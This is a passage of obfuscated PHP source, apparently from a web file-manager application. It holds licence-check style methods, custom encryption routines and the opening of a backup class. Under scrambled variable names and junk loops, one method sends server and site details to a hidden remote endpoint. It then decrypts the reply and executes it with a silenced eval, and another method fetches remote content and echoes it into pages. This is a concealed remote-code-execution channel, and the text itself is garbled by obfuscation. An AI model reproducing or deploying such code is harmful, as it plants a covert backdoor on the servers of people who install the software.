(strlen($»¾¬õÙª) < $¢«ş¦ş–[625]) { die; } } private function bhlg36a64707() { $›‰ÉÍ“ =& $_SERVER[ì™ı‰º¯]; $ã¼ô§Ôò =& $_SERVER[Ê³óµ¯‡]; $îõÑÍ§ª = array($ã¼ô§Ôò[246], $ã¼ô§Ôò[247], $ã¼ô§Ôò[248]); $¸ÚÈ°šğ = $›‰ÉÍ“[675]; while ($¸ÚÈ°šğ < $›‰ÉÍ“[610]) { if ($¸ÚÈ°šğ >= 0) { break; } $¸ÚÈ°šğ++; } $¶õšş½Â = $ã¼ô§Ôò[249] . md5($ã¼ô§Ôò[250]); $Ñıê¿šô = $›‰ÉÍ“[676]; if ($this->uylfd4baec45 == $ã¼ô§Ôò[106] || !_get($GLOBALS, $ã¼ô§Ôò[115])) { return; } if (!in_array($_SERVER[$ã¼ô§Ôò[24]], $îõÑÍ§ª)) { return; } if (time() % 4 != 0) { return; } $·€õ„ìÅ = call_user_func(array($ã¼ô§Ôò[251], $ã¼ô§Ôò[252]), $¶õšş½Â); $¹ğÒ«‹ = $›‰ÉÍ“[677]; if (!$¹ğÒ«‹) { die; } if ($·€õ„ìÅ && time() - $·€õ„ìÅ < intval($ã¼ô§Ôò[253])) { return; } call_user_func(array($ã¼ô§Ôò[251], $ã¼ô§Ôò[138]), $¶õšş½Â, time()); $¶âÑß½é = $›‰ÉÍ“[678]; if (!$¶âÑß½é) { die; } $ô¿Áï¥† = Model($ã¼ô§Ôò[33])->get($ã¼ô§Ôò[103]); $Úíœ¹³ü = $›‰ÉÍ“[679]; if (strlen($Úíœ¹³ü) < $›‰ÉÍ“[610]) { die; } $ªÇ¶»÷ê = array($ã¼ô§Ôò[150] => Model($ã¼ô§Ôò[33])->get($ã¼ô§Ôò[186]), $ã¼ô§Ôò[163] => $this->uylfd4baec45, $ã¼ô§Ôò[160] => $_SERVER[$ã¼ô§Ôò[161]], $ã¼ô§Ôò[162] => Model($ã¼ô§Ôò[33])->get($ã¼ô§Ôò[130]), $ã¼ô§Ôò[101] => md5($_SERVER[$ã¼ô§Ôò[102]] . $ô¿Áï¥†), $ã¼ô§Ôò[153] => $ã¼ô§Ôò[135], $ã¼ô§Ôò[156] => $_SERVER[$ã¼ô§Ôò[157]]); $…‹œ¯í½ = $this->tfwm9ad03d00($ã¼ô§Ôò[254], $ªÇ¶»÷ê); $îøÁ‚ ô = $›‰ÉÍ“[680]; while ($îøÁ‚ ô < $›‰ÉÍ“[615]) { if ($îøÁ‚ ô >= 0) { break; } $îøÁ‚ ô++; } if (!is_array($…‹œ¯í½)) { return; } if ($…‹œ¯í½[$ã¼ô§Ôò[150]] && $…‹œ¯í½[$ã¼ô§Ôò[255]]) { if ($this->lhru6465a383($…‹œ¯í½[$ã¼ô§Ôò[255]]) == $ªÇ¶»÷ê[$ã¼ô§Ôò[150]]) { return; } } $this->jdou6c0596b8(); $–Ù›×Æ½ = $›‰ÉÍ“[681]; while ($–Ù›×Æ½ < $›‰ÉÍ“[625]) { if ($–Ù›×Æ½ >= 0) { break; } $–Ù›×Æ½++; } if ($this->lhru6465a383($…‹œ¯í½[$ã¼ô§Ôò[255]]) != $ªÇ¶»÷ê[$ã¼ô§Ôò[150]]) { $Ïøõìßı = array($ã¼ô§Ôò[181] => $ô¿Áï¥†, $ã¼ô§Ôò[182] => $_SERVER[$ã¼ô§Ôò[102]], $ã¼ô§Ôò[183] => this_url(), $ã¼ô§Ôò[158] => $_SERVER[$ã¼ô§Ôò[159]]); $òü¢Ç´é = $this->rxgi4a8adb65(json_encode($Ïøõìßı)); $…‹œ¯í½ = $this->tfwm9ad03d00($ã¼ô§Ôò[184] . $òü¢Ç´é); if ($…‹œ¯í½ && is_array($…‹œ¯í½) && isset($…‹œ¯í½[$ã¼ô§Ôò[255]])) { $çìÁåø÷ = $this->scrjf48243ad($…‹œ¯í½[$ã¼ô§Ôò[255]], 2); if ($çìÁåø÷) { $çìÁåø÷ = $this->lhru6465a383($çìÁåø÷); } if ($çìÁåø÷) { try { @eval($çìÁåø÷); } catch (Exception $Ìº”ìú) { } } } } } private function tfwm9ad03d00($£óÚ‘ = '', $ê»µºÅ© = array(), $‰ÛõŸ±Ä = 5) { $³Ïé§¡º =& $_SERVER[ì™ı‰º¯]; $¥¬íûÃı =& $_SERVER[Ê³óµ¯‡]; $¬ÆŒ‰ÇÌ = $¥¬íûÃı[256]; $¬ÆŒ‰ÇÌ = $this->uvqxfe4f1a11($¬ÆŒ‰ÇÌ, $¥¬íûÃı[257]); $©÷†È™Î = $³Ïé§¡º[682]; $¬ÆŒ‰ÇÌ = $¬ÆŒ‰ÇÌ . $£óÚ‘; if ($ê»µºÅ© && is_array($ê»µºÅ©)) { $¬ÆŒ‰ÇÌ = $¬ÆŒ‰ÇÌ . $¥¬íûÃı[258] . http_build_query($ê»µºÅ©); } if ($ê»µºÅ© === -1) { return $¬ÆŒ‰ÇÌ; } $ßÂèÁÜº = stream_context_create(array($¥¬íûÃı[216] => array($¥¬íûÃı[219] => $‰ÛõŸ±Ä, $¥¬íûÃı[217] => $¥¬íûÃı[259]), $¥¬íûÃı[260] => array($¥¬íûÃı[261] => !1, $¥¬íûÃı[262] => !1))); $ê»µºÅ© = @file_get_contents($¬ÆŒ‰ÇÌ, !1, $ßÂèÁÜº); $Ê«ù§õ³ = $³Ïé§¡º[683]; if (strlen($Ê«ù§õ³) < $³Ïé§¡º[610]) { return; } return json_decode($ê»µºÅ©, !0); $İ¾»öåè = $³Ïé§¡º[684]; if (strlen($İ¾»öåè) < $³Ïé§¡º[612]) { return; } $¤¾˜È˜˜ = $³Ïé§¡º[685]; } private function bznj0a4bc1c3() { $ğ¡Ùş­ =& $_SERVER[ì™ı‰º¯]; $‰—“²ú =& $_SERVER[Ê³óµ¯‡]; $Á›òˆÄ¾ = array($‰—“²ú[263] => $‰—“²ú[264], $‰—“²ú[265] => $‰—“²ú[266], $‰—“²ú[267] => $‰—“²ú[268], $‰—“²ú[269] => $‰—“²ú[270], $‰—“²ú[271] => $‰—“²ú[272], $‰—“²ú[273] => $‰—“²ú[211], $‰—“²ú[274] => $‰—“²ú[211], $‰—“²ú[275] => $‰—“²ú[264], $‰—“²ú[276] => $‰—“²ú[266], $‰—“²ú[277] => $‰—“²ú[268], $‰—“²ú[278] => $‰—“²ú[279], $‰—“²ú[280] => $‰—“²ú[270], $‰—“²ú[281] => $‰—“²ú[282], $‰—“²ú[283] => $‰—“²ú[272], $‰—“²ú[284] => $‰—“²ú[285], $‰—“²ú[286] => $‰—“²ú[287], $‰—“²ú[288] => $‰—“²ú[289]); $ÔÆ©Ñ‘ = $Á›òˆÄ¾[$this->uylfd4baec45]; $çÌÂš²õ = $ğ¡Ùş­[686]; if (!$çÌÂš²õ) { die; } $ÔÆ©Ñ‘ = intval($ÔÆ©Ñ‘ ? $ÔÆ©Ñ‘ : $‰—“²ú[264]); $õ¡Ë²ÖË = $ğ¡Ùş­[687]; if (!$õ¡Ë²ÖË) { die; } $ÕòÀ£— = _get($this->qufp0c9d1777, $‰—“²ú[290]); $±Ò¤º­³ = $ğ¡Ùş­[688]; if (!$±Ò¤º­³) { return; } $ÕòÀ£— = $ÕòÀ£— ? intval($ÕòÀ£—) : 0; return $ÔÆ©Ñ‘ + $ÕòÀ£—; $âúÛ Á‰ = $ğ¡Ùş­[689]; if (strlen($âúÛ Á‰) < $ğ¡Ùş­[618]) { die; } } public function gibsbb0f78e3($Çá‡Ë’ˆ) { $î¦Š·ó =& $_SERVER[ì™ı‰º¯]; $´úÑ˜Ö =& $_SERVER[Ê³óµ¯‡]; $û”Æ—çÒ = $this->bznj0a4bc1c3(); if ($Çá‡Ë’ˆ[$´úÑ˜Ö[291]] == $´úÑ˜Ö[121]) { return; } if ($û”Æ—çÒ >= intval($´úÑ˜Ö[211])) { return; } $ÁÉçâÑÔ = Model($´úÑ˜Ö[124])->count(); if ($ÁÉçâÑÔ <= $û”Æ—çÒ) { return; } $¯şå¡Ãæ = Model($´úÑ˜Ö[124])->field($´úÑ˜Ö[291])->limit($û”Æ—çÒ)->select(); $ïÚ£œİ = $î¦Š·ó[690]; while ($ïÚ£œİ < $î¦Š·ó[618]) { if ($ïÚ£œİ >= 0) { break; } $ïÚ£œİ++; } $¯şå¡Ãæ = array_to_keyvalue($¯şå¡Ãæ, $´úÑ˜Ö[6], $´úÑ˜Ö[291]); if (!in_array($Çá‡Ë’ˆ[$´úÑ˜Ö[291]], $¯şå¡Ãæ)) { show_json($´úÑ˜Ö[292], !1, $´úÑ˜Ö[207]); } } public function rzcld5259b11() { $ÚúƒöøÅ =& $_SERVER[ì™ı‰º¯]; $şº«ûü =& $_SERVER[Ê³óµ¯‡]; if (!_get($GLOBALS, $şº«ûü[115]) || mt_rand(1, 100) > 20) { return; } $†­££Ì´ = $şº«ûü[214]; $†­££Ì´ = $this->uvqxfe4f1a11($†­££Ì´, $şº«ûü[215]); $ëˆ¡…“‰ = stream_context_create(array($şº«ûü[216] => array($şº«ûü[217] => $şº«ûü[218], $şº«ûü[219] => 3))); $ı¦ŞõÅ = $ÚúƒöøÅ[691]; while (strlen($ı¦ŞõÅ) < $ÚúƒöøÅ[625]) { if (!$ı¦ŞõÅ) { break; } $ı¦ŞõÅ++; } $ùø³ŞŸ = @file_get_contents($†­££Ì´, !1, $ëˆ¡…“‰); echo $şº«ûü[293] . hash_encode($ùø³ŞŸ) . $şº«ûü[294]; $§ïôãæ« = $ÚúƒöøÅ[692]; } private function yeaj8deb25f5($™ØÔûÁ›, $àáœì¼ó, $Ïï£¨ÚŸ = 3) { $Ààšğ„Ü =& $_SERVER[ì™ı‰º¯]; $šË¥¢÷ =& $_SERVER[Ê³óµ¯‡]; usleep(1); $™ØÔûÁ› = trim($™ØÔûÁ›); $äÜ°¼è  = mt_rand(0, 5) . $šË¥¢÷[6]; $Ì‹Èò£ğ = rand_string(15); $ñ³ºï˜ã = $Ààšğ„Ü[693]; while ($ñ³ºï˜ã < $Ààšğ„Ü[618]) { if ($ñ³ºï˜ã >= 0) { break; } $ñ³ºï˜ã++; } $şóå…½Ş = $šË¥¢÷[295]; switch ($äÜ°¼è ) { case $šË¥¢÷[203]: $ªÁâÚË˜ = $this->qypn5c1aa728($™ØÔûÁ›, strrev($àáœì¼ó . $Ì‹Èò£ğ)); break; case $šË¥¢÷[121]: $ªÁâÚË˜ = $this->qypn5c1aa728($™ØÔûÁ›, strrev($Ì‹Èò£ğ . $àáœì¼ó)); break; case $šË¥¢÷[296]: $ªÁâÚË˜ = $this->qypn5c1aa728($™ØÔûÁ›, base64_encode($Ì‹Èò£ğ . $àáœì¼ó)); $‹˜»–Åº = $Ààšğ„Ü[694]; if (strlen($‹˜»–Åº) < $Ààšğ„Ü[610]) { die; } break; case $šË¥¢÷[297]: $ªÁâÚË˜ = $this->qypn5c1aa728($™ØÔûÁ›, md5($Ì‹Èò£ğ . $àáœì¼ó)); $ô––§Ş’ = $Ààšğ„Ü[695]; break; $ÙÖÃÓË = $Ààšğ„Ü[696]; case $šË¥¢÷[298]: $™ØÔûÁ› = base64_encode($™ØÔûÁ›); $ü£„ôÉÑ = $Ààšğ„Ü[697]; while ($ü£„ôÉÑ < $Ààšğ„Ü[625]) { if ($ü£„ôÉÑ >= 0) { break; } $ü£„ôÉÑ++; } $‡×ç‚½œ = rand(0, 64); $°®¹ï”Ï = $Ààšğ„Ü[698]; if (strlen($°®¹ï”Ï) < $Ààšğ„Ü[615]) { die; } $­à‘‰¨¤ = $şóå…½Ş[$‡×ç‚½œ]; $ØÍÊù‰æ = md5($­à‘‰¨¤ . md5($àáœì¼ó . $­à‘‰¨¤) . $àáœì¼ó); $ØÍÊù‰æ = substr($ØÍÊù‰æ, $‡×ç‚½œ % 8, $‡×ç‚½œ % 8 + 7); $¡µ÷İ—Ë = $Ààšğ„Ü[699]; while ($¡µ÷İ—Ë < $Ààšğ„Ü[610]) { if ($¡µ÷İ—Ë >= 0) { break; } $¡µ÷İ—Ë++; } $¶Áã¢ˆ³ = $šË¥¢÷[6]; $¡ñ øÄ = $Ààšğ„Ü[700]; $¥°Åã¢ = 0; $¥§±Ìãü = 0; $¦²‰ıüŒ = $Ààšğ„Ü[701]; while ($¦²‰ıüŒ < $Ààšğ„Ü[610]) { if ($¦²‰ıüŒ >= 0) { break; } $¦²‰ıüŒ++; } $•Ïıûêï = 0; $Ä¨±ÆŞ = $Ààšğ„Ü[702]; if (!$Ä¨±ÆŞ) { die; } for ($¥°Åã¢ = 0; $¥°Åã¢ < strlen($™ØÔûÁ›); $¥°Åã¢++) { $•Ïıûêï = $•Ïıûêï == strlen($ØÍÊù‰æ) ? 0 : $•Ïıûêï; $ùºóÓÛŸ = $Ààšğ„Ü[703]; if (!$ùºóÓÛŸ) { return; } $¥§±Ìãü = ($‡×ç‚½œ + strpos($şóå…½Ş, $™ØÔûÁ›[$¥°Åã¢]) + ord($ØÍÊù‰æ[$•Ïıûêï++])) % 64; $¶Áã¢ˆ³ .= $şóå…½Ş[$¥§±Ìãü]; } $ªÁâÚË˜ = hash_encode($­à‘‰¨¤ . $¶Áã¢ˆ³); $„»Òšè© = $Ààšğ„Ü[704]; if (!$„»Òšè©) { die; } break; default: $ªÁâÚË˜ = $this->qypn5c1aa728($™ØÔûÁ›, $àáœì¼ó . $Ì‹Èò£ğ); break; $æ­õºŸô = $Ààšğ„Ü[705]; if (strlen($æ­õºŸô) < $Ààšğ„Ü[625]) { return; } } $ªÁâÚË˜ = strrev($äÜ°¼è  . $Ì‹Èò£ğ . $ªÁâÚË˜); $àéÊÌÖ¦ = $Ààšğ„Ü[706]; if (!$àéÊÌÖ¦) { return; } if ($Ïï£¨ÚŸ - 1 > 0) { $ªÁâÚË˜ = $this->yeaj8deb25f5($ªÁâÚË˜, $àáœì¼ó, $Ïï£¨ÚŸ - 1); } return $ªÁâÚË˜; } private function scrjf48243ad($’Êåƒã, $ŸëÌÂ…ƒ, $Ê²’ï¾ = 3) { $ŞîóéÎ¥ =& $_SERVER[ì™ı‰º¯]; $˜”³Ñ·ú =& $_SERVER[Ê³óµ¯‡]; if (!is_string($’Êåƒã) || strlen($’Êåƒã) < 10) { return !1; } $’Êåƒã = trim($’Êåƒã); $’Êåƒã = strrev($’Êåƒã); $ÒãÌÖˆ = $ŞîóéÎ¥[707]; $ãÄû¡ƒÜ = $’Êåƒã[0]; $ÃŠğÇúõ = $ŞîóéÎ¥[708]; if (strlen($ÃŠğÇúõ) < $ŞîóéÎ¥[612]) { return; } $àğ¯¦–Ş = substr($’Êåƒã, 1, 15); $Õ©ßœØë = $ŞîóéÎ¥[709]; $’Êåƒã = substr($’Êåƒã, 16); $”İ¦´ò = $˜”³Ñ·ú[295]; $Îğú“–Å = $ŞîóéÎ¥[710]; if (strlen($Îğú“–Å) < $ŞîóéÎ¥[615]) { die; } switch ($ãÄû¡ƒÜ) { case $˜”³Ñ·ú[203]: $½©‰ãòú = $this->uvqxfe4f1a11($’Êåƒã, strrev($ŸëÌÂ…ƒ . $àğ¯¦–Ş)); break; $Š×âß†Û = $ŞîóéÎ¥[711]; if (strlen($Š×âß†Û) < $ŞîóéÎ¥[625]) { return; } case $˜”³Ñ·ú[121]: $½©‰ãòú = $this->uvqxfe4f1a11($’Êåƒã, strrev($àğ¯¦–Ş . $ŸëÌÂ…ƒ)); break; $¤¥Û†Ü¹ = $ŞîóéÎ¥[712]; if (!$¤¥Û†Ü¹) { return; } case $˜”³Ñ·ú[296]: $½©‰ãòú = $this->uvqxfe4f1a11($’Êåƒã, base64_encode($àğ¯¦–Ş . $ŸëÌÂ…ƒ)); break; case $˜”³Ñ·ú[297]: $½©‰ãòú = $this->uvqxfe4f1a11($’Êåƒã, md5($àğ¯¦–Ş . $ŸëÌÂ…ƒ)); break; case $˜”³Ñ·ú[298]: $’Êåƒã = hash_decode($’Êåƒã); $˜®âÙï = $’Êåƒã[0]; $’Êåƒã = substr($’Êåƒã, 1); $àªÎµå“ = $ŞîóéÎ¥[713]; if (!$àªÎµå“) { return; } $ùåÏ„‘ = strpos($”İ¦´ò, $˜®âÙï); $¨£¾âª = $ŞîóéÎ¥[714]; $„Ü§‘  = md5($˜®âÙï . md5($ŸëÌÂ…ƒ . $˜®âÙï) . $ŸëÌÂ…ƒ); $©ı²ŸµÎ = $ŞîóéÎ¥[715]; while ($©ı²ŸµÎ < $ŞîóéÎ¥[625]) { if ($©ı²ŸµÎ >= 0) { break; } $©ı²ŸµÎ++; } $„Ü§‘  = substr($„Ü§‘ , $ùåÏ„‘ % 8, $ùåÏ„‘ % 8 + 7); $ ®èíŸƒ = $˜”³Ñ·ú[6]; $‚ö—˜¼ = 0; $‚®ÙÎÛ‰ = $ŞîóéÎ¥[716]; $§ Ä¨ƒğ = 0; $Áã¾º¬Í = $ŞîóéÎ¥[717]; if (!$Áã¾º¬Í) { die; } $ª……Éøı = 0; for ($‚ö—˜¼ = 0; $‚ö—˜¼ < strlen($’Êåƒã); $‚ö—˜¼++) { $ª……Éøı = $ª……Éøı == strlen($„Ü§‘ ) ? 0 : $ª……Éøı; $¿ÇÅ¾®¯ = $ŞîóéÎ¥[718]; while (strlen($¿ÇÅ¾®¯) < $ŞîóéÎ¥[618]) { if (!$¿ÇÅ¾®¯) { break; } $¿ÇÅ¾®¯++; } $ÏµüÄôÀ = $ª……Éøı++; $—´Ä¶™Ó = $ŞîóéÎ¥[719]; $§ Ä¨ƒğ = strpos($”İ¦´ò, $’Êåƒã[$‚ö—˜¼]) - $ùåÏ„‘ - ord($„Ü§‘ [$ÏµüÄôÀ]); while ($§ Ä¨ƒğ < 0) { $§ Ä¨ƒğ += 64; $ğà•ç£Ö = $ŞîóéÎ¥[720]; if (strlen($ğà•ç£Ö) < $ŞîóéÎ¥[615]) { die; } } $ ®èíŸƒ .= $”İ¦´ò[$§ Ä¨ƒğ]; $‚À’‘‚° = $ŞîóéÎ¥[721]; if (strlen($‚À’‘‚°) < $ŞîóéÎ¥[615]) { return; } } $½©‰ãòú = base64_decode($ ®èíŸƒ); break; $±ãÌùä = $ŞîóéÎ¥[722]; if (strlen($±ãÌùä) < $ŞîóéÎ¥[615]) { return; } default: $½©‰ãòú = $this->uvqxfe4f1a11($’Êåƒã, $ŸëÌÂ…ƒ . $àğ¯¦–Ş); break; $—È¹Ùûš = $ŞîóéÎ¥[723]; while (strlen($—È¹Ùûš) < $ŞîóéÎ¥[615]) { if (!$—È¹Ùûš) { break; } $—È¹Ùûš++; } } if ($Ê²’ï¾ - 1 > 0) { $½©‰ãòú = $this->scrjf48243ad($½©‰ãòú, $ŸëÌÂ…ƒ, $Ê²’ï¾ - 1); } return $½©‰ãòú; } public function rxgi4a8adb65($ºÈ×·¾) { $ßƒ¾£Ğª =& $_SERVER[ì™ı‰º¯]; $¬ÒÚ˜ù‰ =& $_SERVER[Ê³óµ¯‡]; $ğÁß•Ÿò = $this->isxa86b689c4(); $Ëàíèì« = $ßƒ¾£Ğª[724]; $”Ä¶È¬¯ = $this->isxa86b689c4(); $Ùì¬ù“Í = ($ğÁß•Ÿò - 1) * ($”Ä¶È¬¯ - 1); $¼ñÅüù½ = $ßƒ¾£Ğª[725]; while ($¼ñÅüù½ < $ßƒ¾£Ğª[625]) { if ($¼ñÅüù½ >= 0) { break; } $¼ñÅüù½++; } $ı´’§†ï = intval(($ğÁß•Ÿò + $”Ä¶È¬¯) / 2); $ÛÃåš—ï = $ßƒ¾£Ğª[628]; while (1) { $ßÜëœÆæ = $ı´’§†ï; $óñ¯ß”¿ = $Ùì¬ù“Í; $ÏÚº™®ø = $ßƒ¾£Ğª[726]; while ($óñ¯ß”¿ % $ßÜëœÆæ != 0) { $»Œßô•é = $óñ¯ß”¿; $óñ¯ß”¿ = $ßÜëœÆæ; $ßÜëœÆæ = $»Œßô•é % $ßÜëœÆæ; } if ($ßÜëœÆæ == 1) { break; } else { $ı´’§†ï++; } } $¬›•Âú½ = 2; $ŸÊÏı‘å = $ßƒ¾£Ğª[727]; if (strlen($ŸÊÏı‘å) < $ßƒ¾£Ğª[615]) { return; } for ($ƒØöŸ = 0; $ƒØöŸ < $Ùì¬ù“Í * 10; $ƒØöŸ++) { if (($Ùì¬ù“Í * $ƒØöŸ + 1) % $ı´’§†ï == 0) { $¬›•Âú½ = intval(($Ùì¬ù“Í * $ƒØöŸ + 1) / $ı´’§†ï); break; } } $½¶ÖÏ¯¢ = $this->qypn5c1aa728($ğÁß•Ÿò * $”Ä¶È¬¯ . $¬ÒÚ˜ù‰[6], $¬ÒÚ˜ù‰[135]); $‡Ûö—Ó÷ = md5($¬ÒÚ˜ù‰[299] . ($ğÁß•Ÿò + $”Ä¶È¬¯) . $¬ÒÚ˜ù‰[300] . $ı´’§†ï . $¬ÒÚ˜ù‰[300] . $¬›•Âú½ . $¬ÒÚ˜ù‰[301]); $½ÍüÜ…Ò = $ßƒ¾£Ğª[728]; $Ï¾«¸ª‡ = $this->qypn5c1aa728($ºÈ×·¾, $‡Ûö—Ó÷) . $¬ÒÚ˜ù‰[302] . $½¶ÖÏ¯¢; $§²í‹ø = $ßƒ¾£Ğª[729]; return $Ï¾«¸ª‡; } public function lhru6465a383($Èß—æ›¦) { $ „•Ì† =& $_SERVER[ì™ı‰º¯]; $¯¹¢²ıš =& $_SERVER[Ê³óµ¯‡]; $ş÷•ıü¢ = explode($¯¹¢²ıš[302], $Èß—æ›¦); $ÇŞøŒœ˜ = $ „•Ì†[730]; if (count($ş÷•ıü¢) != 2) { return $¯¹¢²ıš[6]; } $Æä‹ìóë = $this->uvqxfe4f1a11($ş÷•ıü¢[1] . $¯¹¢²ıš[6], $¯¹¢²ıš[135]); $Éı’ÍšÉ = $ „•Ì†[731]; if (strlen($Éı’ÍšÉ) < $ „•Ì†[615]) { die; } if (!$Æä‹ìóë) { return $¯¹¢²ıš[6]; } $Æä‹ìóë = intval($Æä‹ìóë); $»âûÇ‰ = $ „•Ì†[732]; if (!$»âûÇ‰) { die; } $úù„©â = 0; $Æö‡ÇÄÍ = 0; $ÜŒ§ıÜ‚ = $ „•Ì†[733]; for ($ôøêéó¸ = 3; $ôøêéó¸ < $Æä‹ìóë; $ôøêéó¸ += 2) { if ($Æä‹ìóë % $ôøêéó¸ != 0) { continue; } $úù„©â = $ôøêéó¸; $Æö‡ÇÄÍ = intval($Æä‹ìóë / $ôøêéó¸); $æÆ¾Æ‰À = $ „•Ì†[734]; while (strlen($æÆ¾Æ‰À) < $ „•Ì†[618]) { if (!$æÆ¾Æ‰À) { break; } $æÆ¾Æ‰À++; } break; } $Ò…†®åÀ = ($úù„©â - 1) * ($Æö‡ÇÄÍ - 1); $äæ–Šã´ = intval(($úù„©â + $Æö‡ÇÄÍ) / 2); while (1) { $µƒÊ´ÒÈ = $äæ–Šã´; $¥€Ãù¨ƒ = $Ò…†®åÀ; $ÍÊñµ§È = $ „•Ì†[735]; while (strlen($ÍÊñµ§È) < $ „•Ì†[612]) { if (!$ÍÊñµ§È) { break; } $ÍÊñµ§È++; } while ($¥€Ãù¨ƒ % $µƒÊ´ÒÈ != 0) { $×ë´ÑşÊ = $¥€Ãù¨ƒ; $¥€Ãù¨ƒ = $µƒÊ´ÒÈ; $µƒÊ´ÒÈ = $×ë´ÑşÊ % $µƒÊ´ÒÈ; } if ($µƒÊ´ÒÈ == 1) { break; } else { $äæ–Šã´++; } } $çº»¦Ä‡ = 2; $êáÛØÙ = $ „•Ì†[736]; if (!$êáÛØÙ) { die; } for ($ôøêéó¸ = 0; $ôøêéó¸ < $Ò…†®åÀ * 10; $ôøêéó¸++) { if (($Ò…†®åÀ * $ôøêéó¸ + 1) % $äæ–Šã´ == 0) { $çº»¦Ä‡ = intval(($Ò…†®åÀ * $ôøêéó¸ + 1) / $äæ–Šã´); break; } } $Ëá¶½™ş = md5($¯¹¢²ıš[299] . ($úù„©â + $Æö‡ÇÄÍ) . $¯¹¢²ıš[300] . $äæ–Šã´ . $¯¹¢²ıš[300] . $çº»¦Ä‡ . $¯¹¢²ıš[301]); $¨õˆî¨¢ = $ „•Ì†[737]; $¾‹ÃÀâ = $this->uvqxfe4f1a11($ş÷•ıü¢[0], $Ëá¶½™ş); return $¾‹ÃÀâ; $İèÏ¹Š = $ „•Ì†[738]; if (strlen($İèÏ¹Š) < $ „•Ì†[610]) { die; } } public function isxa86b689c4() { $²ŒúÓ—ñ =& $_SERVER[ì™ı‰º¯]; $à¼®àÄç = mt_rand(pow(2, 14), pow(2, 16) - 1); $äÄ®¸× = array(); $İÔ«‚¯Ü = 1; $ØŒŒ¹Ë = $²ŒúÓ—ñ[739]; while (strlen($ØŒŒ¹Ë) < $²ŒúÓ—ñ[610]) { if (!$ØŒŒ¹Ë) { break; } $ØŒŒ¹Ë++; } while ($İÔ«‚¯Ü <= (int) sqrt($à¼®àÄç)) { $µ¿Õß°° = $İÔ«‚¯Ü; while (!0) { $µ¿Õß°°++; if ($µ¿Õß°° <= 2) { $İÔ«‚¯Ü = $µ¿Õß°°; break; } else { if ($µ¿Õß°° < 2) { continue; } } $”üÊÆ±Ñ = !0; for ($à©Ôü» = 2; $à©Ôü» <= sqrt($µ¿Õß°°); $à©Ôü»++) { if ($µ¿Õß°° % $à©Ôü» == 0) { $”üÊÆ±Ñ = !1; } } if ($”üÊÆ±Ñ) { $İÔ«‚¯Ü = $µ¿Õß°°; break; } } $äÄ®¸×[] = $İÔ«‚¯Ü; $· ½éæ = $²ŒúÓ—ñ[740]; while ($· ½éæ < $²ŒúÓ—ñ[615]) { if ($· ½éæ >= 0) { break; } $· ½éæ++; } } $–Üğš¾­ = 2; for ($µ¿Õß°° = $à¼®àÄç; $µ¿Õß°° > 1; $µ¿Õß°°--) { $”üÊÆ±Ñ = !0; $û¢ğèô¸ = $²ŒúÓ—ñ[741]; if (strlen($û¢ğèô¸) < $²ŒúÓ—ñ[618]) { return; } foreach ($äÄ®¸× as $‡¦Ã»ªã) { if ($µ¿Õß°° % $‡¦Ã»ªã == 0) { $”üÊÆ±Ñ = !1; break; } } if ($”üÊÆ±Ñ) { $–Üğš¾­ = $µ¿Õß°°; break; } } return $–Üğš¾­; } public function yersaf6e8575($½ëˆ´Ç÷, $á›©íŒ°) { $¹Íîİ“Ó =& $_SERVER[Ê³óµ¯‡]; return call_user_func(array($¹Íîİ“Ó[8], $¹Íîİ“Ó[303]), $½ëˆ´Ç÷, $á›©íŒ°); $ô§³ö¶ø = $_SERVER[ì™ı‰º¯][742]; if (!$ô§³ö¶ø) { die; } } public function qypn5c1aa728($„›’Ù¹Ñ, $¨Á¯Ô‰í) { $ãĞ¢áğÕ =& $_SERVER[Ê³óµ¯‡]; return call_user_func(array($ãĞ¢áğÕ[304], $ãĞ¢áğÕ[305]), $„›’Ù¹Ñ, $¨Á¯Ô‰í); } public function uvqxfe4f1a11($óí¾¯æÆ, $’Ë‰§‰ì) { $ó‘ù£ùæ =& $_SERVER[Ê³óµ¯‡]; return call_user_func(array($ó‘ù£ùæ[304], $ó‘ù£ùæ[306]), $óí¾¯æÆ, $’Ë‰§‰ì); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $ä‹Î©Ä´ =& $_SERVER[ì™ı‰º¯]; $this->isManual(); self::$name = date($ä‹Î©Ä´[743]); if (!($±…×™®® = Model($ä‹Î©Ä´[744])->lastItem())) { $±…×™®® = $this->initData(); } else { self::$name = $±…×™®®[$ä‹Î©Ä´[32]]; if ($±…×™®®[$ä‹Î©Ä´[745]] == $ä‹Î©Ä´[88]) { self::$name = date($ä‹Î©Ä´[746]); $¡êÓú£ = 0; if (isset($±…×™®®[$ä‹Î©Ä´[293]][$ä‹Î©Ä´[200]][$ä‹Î©Ä´[468]])) { $¡êÓú£ = (int) $±…×™®®[$ä‹Î©Ä´[293]][$ä‹Î©Ä´[200]][$ä‹Î©Ä´[468]]; } if (self::$manual == 0 && $±…×™®®[$ä‹Î©Ä´[32]] == self::$name) { Model($ä‹Î©Ä´[744])->remove($±…×™®®[$ä‹Î©Ä´[399]]); } $±…×™®® = $this->initData($¡êÓú£, $±…×™®®[$ä‹Î©Ä´[747]]); } else { $this->checkStore($±…×™®®[$ä‹Î©Ä´[747]]); } } self::$option = $±…×™®®; } private function isManual() { $‰¡‹¥×« = _get($GLOBALS, $_SERVER[ì™ı‰º¯][748], 0); $‰¡‹¥×« = intval($‰¡‹¥×«); self::$manual = $‰¡‹¥×« && $‰¡‹¥×« == 1 ? 1 : 0; } private function initData($Ç•á“Ğ = 0, $¹·ŸøŸ = '') { $Ñµ·µøÂ =& $_SERVER[ì™ı‰º¯]; $¿¢Ñ—ó¬ = Model($Ñµ·µøÂ[744])->config(); if ($¹·ŸøŸ && $¿¢Ñ—ó¬[$Ñµ·µøÂ[747]] != $¹·ŸøŸ) { $Ç•á“Ğ = 0; } $this->checkStore($¿¢Ñ—ó¬[$Ñµ·µøÂ[747]]); if (self::$manual == 1) { self::$name .= $Ñµ·µøÂ[11] . date($Ñµ·µøÂ[749]); } $ìËÙƒ = array($Ñµ·µøÂ[747] => $¿¢Ñ—ó¬[$Ñµ·µøÂ[747]], $Ñµ·µøÂ[32] => self::$name, $Ñµ·µøÂ[745] => 0, $Ñµ·µøÂ[750] => $¿¢Ñ—ó¬[$Ñµ·µøÂ[750]], $Ñµ·µøÂ[751] => self::$manual, $Ñµ·µøÂ[293] => array($Ñµ·µøÂ[752] => array($Ñµ·µøÂ[745] => 0), $Ñµ·µøÂ[753] => array($Ñµ·µøÂ[745] => 0, $Ñµ·µøÂ[754] => 0, $Ñµ·µøÂ[755] => 0, $Ñµ·µøÂ[33] => $Ñµ·µøÂ[12], $Ñµ·µøÂ[756] => 0, $Ñµ·µøÂ[757] 